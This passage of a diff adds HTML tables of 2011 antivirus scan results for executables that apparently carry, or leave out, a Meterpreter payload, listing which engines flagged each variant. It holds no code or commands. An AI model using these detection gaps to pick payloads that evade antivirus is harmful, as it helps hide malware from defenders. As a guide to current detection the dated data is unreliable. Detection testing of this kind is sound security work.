+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 9830c89ace9de8b6df83f11795abf30b60f528a9</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 8f1e5763839c7f5443ef7ee7c8b11bb423b0eadb4b4f8d9bd2e5b406ceb2a781</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 70144 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 12:36:41 (UTC)</td>
+     </tr>
+ </table>
+ 
+ <h2>default_meterpreter</h2>
+ 
+ <table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.07.01</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan/Win32.Shell</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.10.246</td>
+         <td>2011.07.07</td>
+         <td class="positive">TR/Crypt.EPACK.Gen2</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.06</td>
+         <td class="positive">Win32:SwPatch [Wrm]</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.06</td>
+         <td class="positive">Win32:SwPatch [Wrm]</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.06</td>
+         <td class="positive">Win32/Heur</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.07</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.08</td>
+         <td class="positive">Trojan.Swrort.A</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.07</td>
+         <td class="positive">W32/Swrort.A.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9303</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Swrort.1</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Win32.Swrort!IK</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8429</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.08</td>
+         <td class="positive">W32/Swrort.A.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.07</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.07</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Win32.Swrort</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4883</td>
+         <td>2011.07.07</td>
+         <td class="positive">Riskware</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.07</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.08</td>
+         <td class="positive">Swrort.d</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.07</td>
+         <td class="positive">Swrort.d</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6275</td>
+         <td>2011.07.08</td>
+         <td class="positive">a variant of Win32/Rozena.AA</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-07.01</td>
+         <td>2011.07.07</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.06</td>
+         <td class="positive">Trj/Genetic.gen</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.02.03</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.07</td>
+         <td class="positive">Mal/Swrort-C</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Backdoor-PoisonIvy</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9792</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Win32.Swrort.B (v)</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.7.4555</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.114.0</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Rosena.Gen.1</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 3c915479051a19fe98de4fdabc27d021</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> ed50f6dde7f5268d90d99ad2f90d7009b38124a4</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 1da67224417944b7912bad1c0c539d01a7408c3e30ff9293b62fb751fe860ec0</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 73803 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 13:24:18 (UTC)</td>
+     </tr>
+ </table>
+ 
+ <h2>default_none</h2>
+
+ <table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.09.00</td>
+         <td>2011.07.08</td>
+         <td class="positive">Trojan/Win32.Shell</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td class="positive">TR/Crypt.EPACK.Gen2</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32:SwPatch</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32:SwPatch</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32/Heur</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td class="positive">Gen:Variant.Patched.2</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Swrort.A</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td class="positive">W32/Swrort.A.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9328</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Swrort.1</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.08</td>
+         <td class="positive">W32/Swrort.A.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Gen:Variant.Patched.2</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td class="positive">Gen:Variant.Patched.2</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td class="positive">Riskware</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td class="positive">Swrort.d</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td class="positive">Swrort.d</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6279</td>
+         <td>2011.07.09</td>
+         <td class="positive">a variant of Win32/Rozena.AS</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td class="positive">Gen:Variant.Patched.2</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trj/Genetic.gen</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Mal/Swrort-C</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Backdoor-PoisonIvy</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9813</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Win32.Swrort.B (v)</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.115.1</td>
+         <td>2011.07.08</td>
+         <td class="positive">Trojan.Rosena.Gen.1</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 292cbc755151d1101102f3ab0db06036</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> a22e6d9dc8b8b5f510f7979b1f69c5b82d7a75fd</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> ecad74a8388c08a406c7e1269eee5b55fa76f54e1bae478b39be4fb41b074cc0</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 73803 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 13:18:05 (UTC)</td>
+     </tr>
+ </table>
+ 
+ <h2>notepad_meterpreter</h2>
+ 
+ <table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.09.00</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td class="positive">TR/Crypt.EPACK.Gen2</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32:SwPatch [Wrm]</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32:SwPatch [Wrm]</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32/Heur</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td class="positive">W32/Swrort.B.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9328</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Swrort.1</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.08</td>
+         <td class="positive">W32/Swrort.B.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td class="positive">Riskware</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td class="positive">Swrort.f</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td class="positive">Swrort.f</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6279</td>
+         <td>2011.07.09</td>
+         <td class="positive">a variant of Win32/Rozena.AH</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Mal/Swrort-C</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9813</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Win32.Swrort.B (v)</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.115.1</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> a7e8d86f70a3f9473a8dca70076ac623</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 8d29cfd9afc49f9a408894070b3959a7d7f5249e</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 2237e22f1b063a9fa7c2fb9a7b577e12b8989a74d3df6720f70123e4149a4244</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 70145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 13:20:56 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>notepad_none</h2>
+ 
+ <table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.09.00</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td class="positive">TR/Crypt.EPACK.Gen2</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32:SwPatch [Wrm]</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32:SwPatch [Wrm]</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32/Heur</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td class="positive">W32/Swrort.B.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9328</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.08</td>
+         <td class="positive">W32/Swrort.B.gen!Eldorado</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32:SwPatch </td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td class="positive">Riskware</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td class="positive">Swrort.d</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td class="positive">Swrort.d</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6279</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Mal/Swrort-C</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9813</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Win32.Swrort.B (v)</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.115.1</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 3f231ff4e57caaedb4a95eea4cc1d626</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 7f93736091bff6409be9ed44c637cecea58cd340</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 000095fd3d919c235f3bfc3b717c0652959b9ab59fc4dc699ef73b92e3ba8af3</td>
+     </tr>
+     <tr>
